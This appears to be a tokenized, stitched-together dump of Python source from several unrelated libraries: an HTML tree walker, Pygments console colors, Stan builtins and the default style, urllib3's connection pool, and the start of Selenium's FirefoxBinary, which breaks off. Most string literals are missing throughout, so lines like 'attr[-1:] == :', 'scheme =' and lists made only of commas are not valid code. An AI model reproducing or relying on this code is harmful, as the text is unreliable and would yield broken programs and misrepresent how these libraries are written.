~~ ~~ elif type == COMMENT : \n 
~~~ yield self . comment ( details [ 0 ] ) \n 
\n 
~~ elif type == ENTITY : \n 
~~~ yield self . entity ( details [ 0 ] ) \n 
\n 
~~ elif type == DOCUMENT : \n 
~~~ hasChildren = True \n 
\n 
~~ else : \n 
~~~ yield self . unknown ( details [ 0 ] ) \n 
\n 
~~ if hasChildren : \n 
~~~ firstChild = self . getFirstChild ( currentNode ) \n 
~~ else : \n 
~~~ firstChild = None \n 
\n 
~~ if firstChild is not None : \n 
~~~ currentNode = firstChild \n 
~~ else : \n 
~~~ while currentNode is not None : \n 
~~~ details = self . getNodeDetails ( currentNode ) \n 
type , details = details [ 0 ] , details [ 1 : ] \n 
if type == ELEMENT : \n 
~~~ namespace , name , attributes , hasChildren = details \n 
if name not in voidElements : \n 
~~~ yield self . endTag ( namespace , name ) \n 
~~ ~~ if self . tree is currentNode : \n 
~~~ currentNode = None \n 
break \n 
~~ nextSibling = self . getNextSibling ( currentNode ) \n 
if nextSibling is not None : \n 
~~~ currentNode = nextSibling \n 
break \n 
~~ else : \n 
~~~ currentNode = self . getParentNode ( currentNode ) \n 
# -*- coding: utf-8 -*- \n 
~~ ~~ ~~ ~~ ~~ ~~ """\n    pygments.console\n    ~~~~~~~~~~~~~~~~\n\n    Format colored console output.\n\n    :copyright: Copyright 2006-2013 by the Pygments team, see AUTHORS.\n    :license: BSD, see LICENSE for details.\n""" \n 
\n 
esc = "\\x1b[" \n 
\n 
codes = { } \n 
codes [ "" ] = "" \n 
codes [ "reset" ] = esc + "39;49;00m" \n 
\n 
codes [ "bold" ] = esc + "01m" \n 
codes [ "faint" ] = esc + "02m" \n 
codes [ "standout" ] = esc + "03m" \n 
codes [ "underline" ] = esc + "04m" \n 
codes [ "blink" ] = esc + "05m" \n 
codes [ "overline" ] = esc + "06m" \n 
\n 
dark_colors = [ "black" , "darkred" , "darkgreen" , "brown" , "darkblue" , \n 
"purple" , "teal" , "lightgray" ] \n 
light_colors = [ "darkgray" , "red" , "green" , "yellow" , "blue" , \n 
"fuchsia" , "turquoise" , "white" ] \n 
\n 
x = 30 \n 
for d , l in zip ( dark_colors , light_colors ) : \n 
~~~ codes [ d ] = esc + "%im" % x \n 
codes [ l ] = esc + "%i;01m" % x \n 
x += 1 \n 
\n 
~~ del d , l , x \n 
\n 
codes [ "darkteal" ] = codes [ "turquoise" ] \n 
codes [ "darkyellow" ] = codes [ "brown" ] \n 
codes [ "fuscia" ] = codes [ "fuchsia" ] \n 
codes [ "white" ] = codes [ "bold" ] \n 
\n 
\n 
def reset_color ( ) : \n 
~~~ return codes [ "reset" ] \n 
\n 
\n 
~~ def colorize ( color_key , text ) : \n 
~~~ return codes [ color_key ] + text + codes [ "reset" ] \n 
\n 
\n 
~~ def ansiformat ( attr , text ) : \n 
~~~ """\n    Format ``text`` with a color and/or some attributes::\n\n        color       normal color\n        *color*     bold color\n        _color_     underlined color\n        +color+     blinking color\n    """ \n 
result = [ ] \n 
if attr [ : 1 ] == attr [ - 1 : ] == : \n 
~~~ result . append ( codes [ ] ) \n 
attr = attr [ 1 : - 1 ] \n 
~~ if attr [ : 1 ] == attr [ - 1 : ] == : \n 
~~~ result . append ( codes [ ] ) \n 
attr = attr [ 1 : - 1 ] \n 
~~ if attr [ : 1 ] == attr [ - 1 : ] == : \n 
~~~ result . append ( codes [ ] ) \n 
attr = attr [ 1 : - 1 ] \n 
~~ result . append ( codes [ attr ] ) \n 
result . append ( text ) \n 
result . append ( codes [ ] ) \n 
return . join ( result ) \n 
# -*- coding: utf-8 -*- \n 
~~ """\n    pygments.lexers._stan_builtins\n    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n    This file contains the names of functions for Stan used by\n    ``pygments.lexers.math.StanLexer.\n\n    :copyright: Copyright 2006-2013 by the Pygments team, see AUTHORS.\n    :license: BSD, see LICENSE for details.\n""" \n 
\n 
CONSTANTS = [ , \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
] \n 
\n 
FUNCTIONS = [ , \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
] \n 
\n 
DISTRIBUTIONS = [ , \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
] \n 
\n 
# -*- coding: utf-8 -*- \n 
"""\n    pygments.styles.default\n    ~~~~~~~~~~~~~~~~~~~~~~~\n\n    The default highlighting style.\n\n    :copyright: Copyright 2006-2013 by the Pygments team, see AUTHORS.\n    :license: BSD, see LICENSE for details.\n""" \n 
\n 
from pygments . style import Style \n 
from pygments . token import Keyword , Name , Comment , String , Error , Number , Operator , Generic , Whitespace \n 
\n 
\n 
class DefaultStyle ( Style ) : \n 
~~~ """\n    The default style (inspired by Emacs 22).\n    """ \n 
\n 
background_color = "#f8f8f8" \n 
default_style = "" \n 
\n 
styles = { \n 
Whitespace : "#bbbbbb" , \n 
Comment : "italic #408080" , \n 
Comment . Preproc : "noitalic #BC7A00" , \n 
\n 
#Keyword:                   "bold #AA22FF", \n 
Keyword : "bold #008000" , \n 
Keyword . Pseudo : "nobold" , \n 
Keyword . Type : "nobold #B00040" , \n 
\n 
Operator : "#666666" , \n 
Operator . Word : "bold #AA22FF" , \n 
\n 
Name . Builtin : "#008000" , \n 
Name . Function : "#0000FF" , \n 
Name . Class : "bold #0000FF" , \n 
Name . Namespace : "bold #0000FF" , \n 
Name . Exception : "bold #D2413A" , \n 
Name . Variable : "#19177C" , \n 
Name . Constant : "#880000" , \n 
Name . Label : "#A0A000" , \n 
Name . Entity : "bold #999999" , \n 
Name . Attribute : "#7D9029" , \n 
Name . Tag : "bold #008000" , \n 
Name . Decorator : "#AA22FF" , \n 
\n 
String : "#BA2121" , \n 
String . Doc : "italic" , \n 
String . Interpol : "bold #BB6688" , \n 
String . Escape : "bold #BB6622" , \n 
String . Regex : "#BB6688" , \n 
#String.Symbol:             "#B8860B", \n 
String . Symbol : "#19177C" , \n 
String . Other : "#008000" , \n 
Number : "#666666" , \n 
\n 
Generic . Heading : "bold #000080" , \n 
Generic . Subheading : "bold #800080" , \n 
Generic . Deleted : "#A00000" , \n 
Generic . Inserted : "#00A000" , \n 
Generic . Error : "#FF0000" , \n 
Generic . Emph : "italic" , \n 
Generic . Strong : "bold" , \n 
Generic . Prompt : "bold #000080" , \n 
Generic . Output : "#888" , \n 
Generic . Traceback : "#04D" , \n 
\n 
Error : "border:#FF0000" \n 
} \n 
# urllib3/connectionpool.py \n 
# Copyright 2008-2013 Andrey Petrov and contributors (see CONTRIBUTORS.txt) \n 
# \n 
# This module is part of urllib3 and is released under \n 
# the MIT License: http://www.opensource.org/licenses/mit-license.php \n 
\n 
~~ import errno \n 
import logging \n 
\n 
from socket import error as SocketError , timeout as SocketTimeout \n 
import socket \n 
\n 
try : # Python 3 \n 
~~~ from queue import LifoQueue , Empty , Full \n 
~~ except ImportError : \n 
~~~ from Queue import LifoQueue , Empty , Full \n 
import Queue as _ # Platform-specific: Windows \n 
\n 
\n 
~~ from . exceptions import ( \n 
ClosedPoolError , \n 
ConnectTimeoutError , \n 
EmptyPoolError , \n 
HostChangedError , \n 
MaxRetryError , \n 
SSLError , \n 
TimeoutError , \n 
ReadTimeoutError , \n 
ProxyError , \n 
) \n 
from . packages . ssl_match_hostname import CertificateError \n 
from . packages import six \n 
from . connection import ( \n 
DummyConnection , \n 
HTTPConnection , HTTPSConnection , VerifiedHTTPSConnection , \n 
HTTPException , BaseSSLError , \n 
) \n 
from . request import RequestMethods \n 
from . response import HTTPResponse \n 
from . util import ( \n 
assert_fingerprint , \n 
get_host , \n 
is_connection_dropped , \n 
Timeout , \n 
) \n 
\n 
\n 
xrange = six . moves . xrange \n 
\n 
log = logging . getLogger ( __name__ ) \n 
\n 
_Default = object ( ) \n 
\n 
port_by_scheme = { \n 
: 80 , \n 
: 443 , \n 
} \n 
\n 
\n 
## Pool objects \n 
\n 
class ConnectionPool ( object ) : \n 
~~~ """\n    Base class for all connection pools, such as\n    :class:`.HTTPConnectionPool` and :class:`.HTTPSConnectionPool`.\n    """ \n 
\n 
scheme = None \n 
QueueCls = LifoQueue \n 
\n 
def __init__ ( self , host , port = None ) : \n 
\n 
~~~ host = host . strip ( ) \n 
\n 
self . host = host \n 
self . port = port \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return % ( type ( self ) . __name__ , \n 
self . host , self . port ) \n 
\n 
# This is taken from http://hg.python.org/cpython/file/7aaba721ebc0/Lib/socket.py#l252 \n 
~~ ~~ _blocking_errnos = set ( [ errno . EAGAIN , errno . EWOULDBLOCK ] ) \n 
\n 
class HTTPConnectionPool ( ConnectionPool , RequestMethods ) : \n 
~~~ """\n    Thread-safe connection pool for one host.\n\n    :param host:\n        Host used for this HTTP Connection (e.g. "localhost"), passed into\n        :class:`httplib.HTTPConnection`.\n\n    :param port:\n        Port used for this HTTP Connection (None is equivalent to 80), passed\n        into :class:`httplib.HTTPConnection`.\n\n    :param strict:\n        Causes BadStatusLine to be raised if the status line can\'t be parsed\n        as a valid HTTP/1.0 or 1.1 status line, passed into\n        :class:`httplib.HTTPConnection`.\n\n        .. note::\n           Only works in Python 2. This parameter is ignored in Python 3.\n\n    :param timeout:\n        Socket timeout in seconds for each individual connection. This can\n        be a float or integer, which sets the timeout for the HTTP request,\n        or an instance of :class:`urllib3.util.Timeout` which gives you more\n        fine-grained control over request timeouts. After the constructor has\n        been parsed, this is always a `urllib3.util.Timeout` object.\n\n    :param maxsize:\n        Number of connections to save that can be reused. More than 1 is useful\n        in multithreaded situations. If ``block`` is set to false, more\n        connections will be created but they will not be saved once they\'ve\n        been used.\n\n    :param block:\n        If set to True, no more than ``maxsize`` connections will be used at\n        a time. When no free connections are available, the call will block\n        until a connection has been released. This is a useful side effect for\n        particular multithreaded situations where one does not want to use more\n        than maxsize connections per host to prevent flooding.\n\n    :param headers:\n        Headers to include with all requests, unless other headers are given\n        explicitly.\n\n    :param _proxy:\n        Parsed proxy URL, should not be used directly, instead, see\n        :class:`urllib3.connectionpool.ProxyManager`"\n\n    :param _proxy_headers:\n        A dictionary with proxy headers, should not be used directly,\n        instead, see :class:`urllib3.connectionpool.ProxyManager`"\n    """ \n 
\n 
scheme = \n 
ConnectionCls = HTTPConnection \n 
\n 
def __init__ ( self , host , port = None , strict = False , \n 
timeout = Timeout . DEFAULT_TIMEOUT , maxsize = 1 , block = False , \n 
headers = None , _proxy = None , _proxy_headers = None ) : \n 
~~~ ConnectionPool . __init__ ( self , host , port ) \n 
RequestMethods . __init__ ( self , headers ) \n 
\n 
self . strict = strict \n 
\n 
# This is for backwards compatibility and can be removed once a timeout \n 
# can only be set to a Timeout object \n 
if not isinstance ( timeout , Timeout ) : \n 
~~~ timeout = Timeout . from_float ( timeout ) \n 
\n 
~~ self . timeout = timeout \n 
\n 
self . pool = self . QueueCls ( maxsize ) \n 
self . block = block \n 
\n 
self . proxy = _proxy \n 
self . proxy_headers = _proxy_headers or { } \n 
\n 
# Fill the queue up so that doing get() on it will block properly \n 
for _ in xrange ( maxsize ) : \n 
~~~ self . pool . put ( None ) \n 
\n 
# These are mostly for testing and debugging purposes. \n 
~~ self . num_connections = 0 \n 
self . num_requests = 0 \n 
\n 
~~ def _new_conn ( self ) : \n 
~~~ """\n        Return a fresh :class:`httplib.HTTPConnection`.\n        """ \n 
self . num_connections += 1 \n 
log . info ( "Starting new HTTP connection (%d): %s" % \n 
( self . num_connections , self . host ) ) \n 
\n 
extra_params = { } \n 
if not six . PY3 : # Python 2 \n 
~~~ extra_params [ ] = self . strict \n 
\n 
~~ return self . ConnectionCls ( host = self . host , port = self . port , \n 
timeout = self . timeout . connect_timeout , \n 
** extra_params ) \n 
\n 
~~ def _get_conn ( self , timeout = None ) : \n 
~~~ """\n        Get a connection. Will return a pooled connection if one is available.\n\n        If no connections are available and :prop:`.block` is ``False``, then a\n        fresh connection is returned.\n\n        :param timeout:\n            Seconds to wait before giving up and raising\n            :class:`urllib3.exceptions.EmptyPoolError` if the pool is empty and\n            :prop:`.block` is ``True``.\n        """ \n 
conn = None \n 
try : \n 
~~~ conn = self . pool . get ( block = self . block , timeout = timeout ) \n 
\n 
~~ except AttributeError : # self.pool is None \n 
~~~ raise ClosedPoolError ( self , "Pool is closed." ) \n 
\n 
~~ except Empty : \n 
~~~ if self . block : \n 
~~~ raise EmptyPoolError ( self , \n 
"Pool reached maximum size and no more " \n 
"connections are allowed." ) \n 
~~ pass \n 
\n 
# If this is a persistent connection, check if it got disconnected \n 
~~ if conn and is_connection_dropped ( conn ) : \n 
~~~ log . info ( "Resetting dropped connection: %s" % self . host ) \n 
conn . close ( ) \n 
\n 
~~ return conn or self . _new_conn ( ) \n 
\n 
~~ def _put_conn ( self , conn ) : \n 
~~~ """\n        Put a connection back into the pool.\n\n        :param conn:\n            Connection object for the current host and port as returned by\n            :meth:`._new_conn` or :meth:`._get_conn`.\n\n        If the pool is already full, the connection is closed and discarded\n        because we exceeded maxsize. If connections are discarded frequently,\n        then maxsize should be increased.\n\n        If the pool is closed, then the connection will be closed and discarded.\n        """ \n 
try : \n 
~~~ self . pool . put ( conn , block = False ) \n 
return # Everything is dandy, done. \n 
~~ except AttributeError : \n 
# self.pool is None. \n 
~~~ pass \n 
~~ except Full : \n 
# This should never happen if self.block == True \n 
~~~ log . warning ( "HttpConnectionPool is full, discarding connection: %s" \n 
% self . host ) \n 
\n 
# Connection never got put back into the pool, close it. \n 
~~ if conn : \n 
~~~ conn . close ( ) \n 
\n 
~~ ~~ def _get_timeout ( self , timeout ) : \n 
~~~ """ Helper that always returns a :class:`urllib3.util.Timeout` """ \n 
if timeout is _Default : \n 
~~~ return self . timeout . clone ( ) \n 
\n 
~~ if isinstance ( timeout , Timeout ) : \n 
~~~ return timeout . clone ( ) \n 
~~ else : \n 
# User passed us an int/float. This is for backwards compatibility, \n 
# can be removed later \n 
~~~ return Timeout . from_float ( timeout ) \n 
\n 
~~ ~~ def _make_request ( self , conn , method , url , timeout = _Default , \n 
** httplib_request_kw ) : \n 
~~~ """\n        Perform a request on a given httplib connection object taken from our\n        pool.\n\n        :param conn:\n            a connection from one of our connection pools\n\n        :param timeout:\n            Socket timeout in seconds for the request. This can be a\n            float or integer, which will set the same timeout value for\n            the socket connect and the socket read, or an instance of\n            :class:`urllib3.util.Timeout`, which gives you more fine-grained\n            control over your timeouts.\n        """ \n 
self . num_requests += 1 \n 
\n 
timeout_obj = self . _get_timeout ( timeout ) \n 
\n 
try : \n 
~~~ timeout_obj . start_connect ( ) \n 
conn . timeout = timeout_obj . connect_timeout \n 
# conn.request() calls httplib.*.request, not the method in \n 
# urllib3.request. It also calls makefile (recv) on the socket. \n 
conn . request ( method , url , ** httplib_request_kw ) \n 
~~ except SocketTimeout : \n 
~~~ raise ConnectTimeoutError ( \n 
self , "Connection to %s timed out. (connect timeout=%s)" % \n 
( self . host , timeout_obj . connect_timeout ) ) \n 
\n 
# Reset the timeout for the recv() on the socket \n 
~~ read_timeout = timeout_obj . read_timeout \n 
\n 
\n 
if hasattr ( conn , ) : \n 
# In Python 3 socket.py will catch EAGAIN and return None when you \n 
# try and read into the file pointer created by http.client, which \n 
# instead raises a BadStatusLine exception. Instead of catching \n 
# the exception and assuming all BadStatusLine exceptions are read \n 
# timeouts, check for a zero timeout before making the request. \n 
~~~ if read_timeout == 0 : \n 
~~~ raise ReadTimeoutError ( \n 
self , url , \n 
"Read timed out. (read timeout=%s)" % read_timeout ) \n 
~~ if read_timeout is Timeout . DEFAULT_TIMEOUT : \n 
~~~ conn . sock . settimeout ( socket . getdefaulttimeout ( ) ) \n 
~~ else : # None or a value \n 
~~~ conn . sock . settimeout ( read_timeout ) \n 
\n 
# Receive the response from the server \n 
~~ ~~ try : \n 
~~~ try : # Python 2.7+, use buffering of HTTP responses \n 
~~~ httplib_response = conn . getresponse ( buffering = True ) \n 
~~ except TypeError : # Python 2.6 and older \n 
~~~ httplib_response = conn . getresponse ( ) \n 
~~ ~~ except SocketTimeout : \n 
~~~ raise ReadTimeoutError ( \n 
self , url , "Read timed out. (read timeout=%s)" % read_timeout ) \n 
\n 
~~ except BaseSSLError as e : \n 
# Catch possible read timeouts thrown as SSL errors. If not the \n 
# case, rethrow the original. We need to do this because of: \n 
# http://bugs.python.org/issue10272 \n 
~~~ if in str ( e ) or in str ( e ) : # Python 2.6 \n 
~~~ raise ReadTimeoutError ( self , url , "Read timed out." ) \n 
\n 
~~ raise \n 
\n 
~~ except SocketError as e : # Platform-specific: Python 2 \n 
# See the above comment about EAGAIN in Python 3. In Python 2 we \n 
# have to specifically catch it and throw the timeout error \n 
~~~ if e . errno in _blocking_errnos : \n 
~~~ raise ReadTimeoutError ( \n 
self , url , \n 
"Read timed out. (read timeout=%s)" % read_timeout ) \n 
\n 
~~ raise \n 
\n 
\n 
~~ http_version = getattr ( conn , , ) \n 
log . debug ( "\\"%s %s %s\\" %s %s" % ( method , url , http_version , \n 
httplib_response . status , \n 
httplib_response . length ) ) \n 
return httplib_response \n 
\n 
~~ def close ( self ) : \n 
~~~ """\n        Close all pooled connections and disable the pool.\n        """ \n 
# Disable access to the pool \n 
old_pool , self . pool = self . pool , None \n 
\n 
try : \n 
~~~ while True : \n 
~~~ conn = old_pool . get ( block = False ) \n 
if conn : \n 
~~~ conn . close ( ) \n 
\n 
~~ ~~ ~~ except Empty : \n 
~~~ pass # Done. \n 
\n 
~~ ~~ def is_same_host ( self , url ) : \n 
~~~ """\n        Check if the given ``url`` is a member of the same host as this\n        connection pool.\n        """ \n 
if url . startswith ( ) : \n 
~~~ return True \n 
\n 
# TODO: Add optional support for socket.gethostbyname checking. \n 
~~ scheme , host , port = get_host ( url ) \n 
\n 
if self . port and not port : \n 
# Use explicit default port for comparison when none is given. \n 
~~~ port = port_by_scheme . get ( scheme ) \n 
\n 
~~ return ( scheme , host , port ) == ( self . scheme , self . host , self . port ) \n 
\n 
~~ def urlopen ( self , method , url , body = None , headers = None , retries = 3 , \n 
redirect = True , assert_same_host = True , timeout = _Default , \n 
pool_timeout = None , release_conn = None , ** response_kw ) : \n 
~~~ """\n        Get a connection from the pool and perform an HTTP request. This is the\n        lowest level call for making a request, so you\'ll need to specify all\n        the raw details.\n\n        .. note::\n\n           More commonly, it\'s appropriate to use a convenience method provided\n           by :class:`.RequestMethods`, such as :meth:`request`.\n\n        .. note::\n\n           `release_conn` will only behave as expected if\n           `preload_content=False` because we want to make\n           `preload_content=False` the default behaviour someday soon without\n           breaking backwards compatibility.\n\n        :param method:\n            HTTP request method (such as GET, POST, PUT, etc.)\n\n        :param body:\n            Data to send in the request body (useful for creating\n            POST requests, see HTTPConnectionPool.post_url for\n            more convenience).\n\n        :param headers:\n            Dictionary of custom headers to send, such as User-Agent,\n            If-None-Match, etc. If None, pool headers are used. If provided,\n            these headers completely replace any pool-specific headers.\n\n        :param retries:\n            Number of retries to allow before raising a MaxRetryError exception.\n\n        :param redirect:\n            If True, automatically handle redirects (status codes 301, 302,\n            303, 307, 308). Each redirect counts as a retry.\n\n        :param assert_same_host:\n            If ``True``, will make sure that the host of the pool requests is\n            consistent else will raise HostChangedError. When False, you can\n            use the pool on an HTTP proxy and request foreign hosts.\n\n        :param timeout:\n            If specified, overrides the default timeout for this one\n            request. It may be a float (in seconds) or an instance of\n            :class:`urllib3.util.Timeout`.\n\n        :param pool_timeout:\n            If set and the pool is set to block=True, then this method will\n            block for ``pool_timeout`` seconds and raise EmptyPoolError if no\n            connection is available within the time period.\n\n        :param release_conn:\n            If False, then the urlopen call will not release the connection\n            back into the pool once a response is received (but will release if\n            you read the entire contents of the response such as when\n            `preload_content=True`). This is useful if you\'re not preloading\n            the response\'s content immediately. You will need to call\n            ``r.release_conn()`` on the response ``r`` to return the connection\n            back into the pool. If None, it takes the value of\n            ``response_kw.get(\'preload_content\', True)``.\n\n        :param \\**response_kw:\n            Additional parameters are passed to\n            :meth:`urllib3.response.HTTPResponse.from_httplib`\n        """ \n 
if headers is None : \n 
~~~ headers = self . headers \n 
\n 
~~ if retries < 0 : \n 
~~~ raise MaxRetryError ( self , url ) \n 
\n 
~~ if release_conn is None : \n 
~~~ release_conn = response_kw . get ( , True ) \n 
\n 
# Check host \n 
~~ if assert_same_host and not self . is_same_host ( url ) : \n 
~~~ raise HostChangedError ( self , url , retries - 1 ) \n 
\n 
~~ conn = None \n 
\n 
# Merge the proxy headers. Only do this in HTTP. We have to copy the \n 
# headers dict so we can safely change it without those changes being \n 
\n 
if self . scheme == : \n 
~~~ headers = headers . copy ( ) \n 
headers . update ( self . proxy_headers ) \n 
\n 
~~ try : \n 
# Request a connection from the queue \n 
~~~ conn = self . _get_conn ( timeout = pool_timeout ) \n 
\n 
# Make the request on the httplib connection object \n 
httplib_response = self . _make_request ( conn , method , url , \n 
timeout = timeout , \n 
body = body , headers = headers ) \n 
\n 
\n 
\n 
\n 
# mess. \n 
response_conn = not release_conn and conn \n 
\n 
\n 
response = HTTPResponse . from_httplib ( httplib_response , \n 
pool = self , \n 
connection = response_conn , \n 
** response_kw ) \n 
\n 
# else: \n 
#     The connection will be put back into the pool when \n 
#     ``response.release_conn()`` is called (implicitly by \n 
#     ``response.read()``) \n 
\n 
~~ except Empty : \n 
# Timed out by queue \n 
~~~ raise EmptyPoolError ( self , "No pool connections are available." ) \n 
\n 
~~ except BaseSSLError as e : \n 
~~~ raise SSLError ( e ) \n 
\n 
~~ except CertificateError as e : \n 
# Name mismatch \n 
~~~ raise SSLError ( e ) \n 
\n 
~~ except TimeoutError as e : \n 
# Connection broken, discard. \n 
~~~ conn = None \n 
# Save the error off for retry logic. \n 
err = e \n 
\n 
if retries == 0 : \n 
~~~ raise \n 
\n 
~~ ~~ except ( HTTPException , SocketError ) as e : \n 
~~~ if isinstance ( e , SocketError ) and self . proxy is not None : \n 
~~~ raise ProxyError ( \n 
% e ) \n 
\n 
# Connection broken, discard. It will be replaced next _get_conn(). \n 
~~ conn = None \n 
# This is necessary so we can access e below \n 
err = e \n 
\n 
if retries == 0 : \n 
~~~ raise MaxRetryError ( self , url , e ) \n 
\n 
~~ ~~ finally : \n 
~~~ if release_conn : \n 
# Put the connection back to be reused. If the connection is \n 
# expired then it will be None, which will get replaced with a \n 
# fresh connection during _get_conn. \n 
~~~ self . _put_conn ( conn ) \n 
\n 
~~ ~~ if not conn : \n 
# Try again \n 
~~~ log . warn ( "Retrying (%d attempts remain) after connection " \n 
"broken by \'%r\': %s" % ( retries , err , url ) ) \n 
return self . urlopen ( method , url , body , headers , retries - 1 , \n 
redirect , assert_same_host , \n 
timeout = timeout , pool_timeout = pool_timeout , \n 
release_conn = release_conn , ** response_kw ) \n 
\n 
# Handle redirect? \n 
~~ redirect_location = redirect and response . get_redirect_location ( ) \n 
if redirect_location : \n 
~~~ if response . status == 303 : \n 
~~~ method = \n 
~~ log . info ( "Redirecting %s -> %s" % ( url , redirect_location ) ) \n 
return self . urlopen ( method , redirect_location , body , headers , \n 
retries - 1 , redirect , assert_same_host , \n 
timeout = timeout , pool_timeout = pool_timeout , \n 
release_conn = release_conn , ** response_kw ) \n 
\n 
~~ return response \n 
\n 
\n 
~~ ~~ class HTTPSConnectionPool ( HTTPConnectionPool ) : \n 
~~~ """\n    Same as :class:`.HTTPConnectionPool`, but HTTPS.\n\n    When Python is compiled with the :mod:`ssl` module, then\n    :class:`.VerifiedHTTPSConnection` is used, which *can* verify certificates,\n    instead of :class:`httplib.HTTPSConnection`.\n\n    :class:`.VerifiedHTTPSConnection` uses one of ``assert_fingerprint``,\n    ``assert_hostname`` and ``host`` in this order to verify connections.\n    If ``assert_hostname`` is False, no verification is done.\n\n    The ``key_file``, ``cert_file``, ``cert_reqs``, ``ca_certs`` and\n    ``ssl_version`` are only used if :mod:`ssl` is available and are fed into\n    :meth:`urllib3.util.ssl_wrap_socket` to upgrade the connection socket\n    into an SSL socket.\n    """ \n 
\n 
scheme = \n 
ConnectionCls = HTTPSConnection \n 
\n 
def __init__ ( self , host , port = None , \n 
strict = False , timeout = None , maxsize = 1 , \n 
block = False , headers = None , \n 
_proxy = None , _proxy_headers = None , \n 
key_file = None , cert_file = None , cert_reqs = None , \n 
ca_certs = None , ssl_version = None , \n 
assert_hostname = None , assert_fingerprint = None ) : \n 
\n 
~~~ HTTPConnectionPool . __init__ ( self , host , port , strict , timeout , maxsize , \n 
block , headers , _proxy , _proxy_headers ) \n 
self . key_file = key_file \n 
self . cert_file = cert_file \n 
self . cert_reqs = cert_reqs \n 
self . ca_certs = ca_certs \n 
self . ssl_version = ssl_version \n 
self . assert_hostname = assert_hostname \n 
self . assert_fingerprint = assert_fingerprint \n 
\n 
~~ def _prepare_conn ( self , conn ) : \n 
~~~ """\n        Prepare the ``connection`` for :meth:`urllib3.util.ssl_wrap_socket`\n        and establish the tunnel if proxy is used.\n        """ \n 
\n 
if isinstance ( conn , VerifiedHTTPSConnection ) : \n 
~~~ conn . set_cert ( key_file = self . key_file , \n 
cert_file = self . cert_file , \n 
cert_reqs = self . cert_reqs , \n 
ca_certs = self . ca_certs , \n 
assert_hostname = self . assert_hostname , \n 
assert_fingerprint = self . assert_fingerprint ) \n 
conn . ssl_version = self . ssl_version \n 
\n 
~~ if self . proxy is not None : \n 
# Python 2.7+ \n 
~~~ try : \n 
~~~ set_tunnel = conn . set_tunnel \n 
~~ except AttributeError : # Platform-specific: Python 2.6 \n 
~~~ set_tunnel = conn . _set_tunnel \n 
~~ set_tunnel ( self . host , self . port , self . proxy_headers ) \n 
# Establish tunnel connection early, because otherwise httplib \n 
\n 
conn . connect ( ) \n 
\n 
~~ return conn \n 
\n 
~~ def _new_conn ( self ) : \n 
~~~ """\n        Return a fresh :class:`httplib.HTTPSConnection`.\n        """ \n 
self . num_connections += 1 \n 
log . info ( "Starting new HTTPS connection (%d): %s" \n 
% ( self . num_connections , self . host ) ) \n 
\n 
if not self . ConnectionCls or self . ConnectionCls is DummyConnection : \n 
# Platform-specific: Python without ssl \n 
~~~ raise SSLError ( "Can\'t connect to HTTPS URL because the SSL " \n 
"module is not available." ) \n 
\n 
~~ actual_host = self . host \n 
actual_port = self . port \n 
if self . proxy is not None : \n 
~~~ actual_host = self . proxy . host \n 
actual_port = self . proxy . port \n 
\n 
~~ extra_params = { } \n 
if not six . PY3 : # Python 2 \n 
~~~ extra_params [ ] = self . strict \n 
\n 
~~ conn = self . ConnectionCls ( host = actual_host , port = actual_port , \n 
timeout = self . timeout . connect_timeout , \n 
** extra_params ) \n 
\n 
return self . _prepare_conn ( conn ) \n 
\n 
\n 
~~ ~~ def connection_from_url ( url , ** kw ) : \n 
~~~ """\n    Given a url, return an :class:`.ConnectionPool` instance of its host.\n\n    This is a shortcut for not having to parse out the scheme, host, and port\n    of the url before creating an :class:`.ConnectionPool` instance.\n\n    :param url:\n        Absolute URL string that must include the scheme. Port is optional.\n\n    :param \\**kw:\n        Passes additional parameters to the constructor of the appropriate\n        :class:`.ConnectionPool`. Useful for specifying things like\n        timeout, maxsize, headers, etc.\n\n    Example: ::\n\n        >>> conn = connection_from_url(\'http://google.com/\')\n        >>> r = conn.request(\'GET\', \'/\')\n    """ \n 
scheme , host , port = get_host ( url ) \n 
if scheme == : \n 
~~~ return HTTPSConnectionPool ( host , port = port , ** kw ) \n 
~~ else : \n 
~~~ return HTTPConnectionPool ( host , port = port , ** kw ) \n 
# Copyright 2008-2011 WebDriver committers \n 
# Copyright 2008-2011 Google Inc. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
\n 
~~ ~~ import os \n 
import platform \n 
from subprocess import Popen , STDOUT \n 
from selenium . common . exceptions import WebDriverException \n 
from selenium . webdriver . common import utils \n 
import time \n 
\n 
\n 
class FirefoxBinary ( object ) : \n 
\n 
~~~ NO_FOCUS_LIBRARY_NAME = "x_ignore_nofocus.so" \n 
\n 
def __init__ ( self , firefox_path = None , log_file = None ) : \n 
